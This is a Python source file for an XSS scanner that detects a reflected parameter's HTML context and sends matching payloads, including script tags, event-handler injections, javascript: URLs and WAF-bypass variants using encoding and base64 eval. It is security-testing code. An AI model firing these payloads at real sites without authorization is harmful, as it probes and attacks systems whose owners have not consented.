"""XSS Context-Aware Scanner"""
import logging
import re
from typing import Optional
from scanners.base_scanner import BaseScanner

log = logging.getLogger("xone.scanners.xss")


class XSSContextScanner(BaseScanner):
    """XSS vulnerability scanner with context detection"""

    @property
    def name(self) -> str:
        return "xss_context_scanner"

    @property
    def description(self) -> str:
        return "XSS context-aware: detects injection point type and suggests payloads"

    # Payloads organized by context
    PAYLOADS = {
        "html_body": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
        ],
        "html_attribute": [
            "\" onmouseover=\"alert(1)",
            "' onmouseover='alert(1)",
            "\" onfocus=\"alert(1) \"",
            "' onfocus='alert(1) '",
        ],
        "javascript": [
            "\";alert(1);//",
            "';alert(1);//",
            "\";alert(String.fromCharCode(88,79,78,69));//",
        ],
        "url": [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ],
        "comment": [
            "--><script>alert(1)</script><!--",
            "*/alert(1)/*",
        ],
        "json": [
            "\",\"xss\":\"<script>alert(1)</script>",
            "\"\\n<img src=x onerror=alert(1)>",
        ]
    }

    async def scan(self, url: str, param: str, test_value: str = "XONE_TEST") -> list[Finding]:
        """
        Scan URL parameter for XSS vulnerabilities

        Args:
            url: Target URL
            param: Parameter name to test
            test_value: Test string to inject
        """
        self.findings = []

        log.info(f"[XSS] Scanning: {url}?{param}={test_value}")

        # Construct test URL
        test_url = f"{url}?{param}={test_value}"

        try:
            response = await self.client.get(test_url, allow_redirects=True)
            response_text = response.text.lower()
            test_value_lower = test_value.lower()

            # Detect context
            context = self._detect_context(response.text, test_value)
            log.info(f"[XSS] Detected context: {context}")

            # Test payloads based on context
            if context in self.PAYLOADS:
                await self._test_payloads(url, param, context, self.PAYLOADS[context])

            return self.findings

        except Exception as e:
            log.error(f"[XSS] Scan error: {e}")
            return self.findings

    def _detect_context(self, html: str, marker: str) -> str:
        """Detect where the marker appears in HTML"""
        html_lower = html.lower()
        marker_lower = marker.lower()

        if marker_lower not in html_lower:
            return "unknown"

        # Find position of marker
        idx = html_lower.find(marker_lower)
        before = html_lower[max(0, idx-100):idx]
        after = html_lower[idx + len(marker_lower):idx + len(marker_lower) + 100]

        # Check context patterns
        if re.search(r'<script[^>]*>', before):
            return "javascript"
        elif re.search(r'on\w+\s*=', before):
            return "html_attribute"
        elif re.search(r'href\s*=|src\s*=', before):
            return "url"
        elif re.search(r'<!--', before) and not re.search(r'-->', after):
            return "comment"
        elif '{' in before or 'json' in before:
            return "json"
        else:
            return "html_body"

    async def _test_payloads(self, url: str, param: str, context: str, payloads: list) -> None:
        """Test payloads for a specific context"""
        for payload in payloads:
            try:
                test_url = f"{url}?{param}={payload.replace(' ', '+')}"
                response = await self.client.get(test_url, allow_redirects=True)

                # Check if payload is reflected
                if payload in response.text or payload.split()[0] in response.text:
                    severity = "High" if context == "javascript" else "Medium"
                    cvss_score = 7.1 if context == "javascript" else 5.0

                    self.create_finding(
                        vuln_type=f"XSS {context.replace('_', ' ').title()}",
                        url=url,
                        payload=payload,
                        severity=severity,
                        param=param,
                        context=f"XSS in {context} context",
                        cvss_score=cvss_score,
                        cvss_vector="AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N"
                    )
                    log.info(f"[XSS] Found: {payload[:50]}")

            except Exception as e:
                log.debug(f"[XSS] Payload test error: {e}")
                continue

    async def test_waf_bypass(self, url: str, param: str) -> list[str]:
        """Test common WAF bypass techniques"""
        bypass_payloads = [
            "<ScRiPt>alert(1)</ScRiPt>",  # Case variation
            "&#60;script&#62;alert(1)&#60;/script&#62;",  # HTML entities
            "<script>alert(\\u0031)</script>",  # Unicode
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",  # Base64
            "<svg/onload=alert.call(null,1)>",  # Alternative call
        ]

        working_payloads = []

        for payload in bypass_payloads:
            try:
                test_url = f"{url}?{param}={payload.replace(' ', '+')}"
                response = await self.client.get(test_url)

                if "script" in response.text.lower() or "alert" in response.text.lower():
                    working_payloads.append(payload)
                    log.info(f"[WAF BYPASS] Working: {payload[:40]}")

            except Exception:
                continue

        return working_payloads
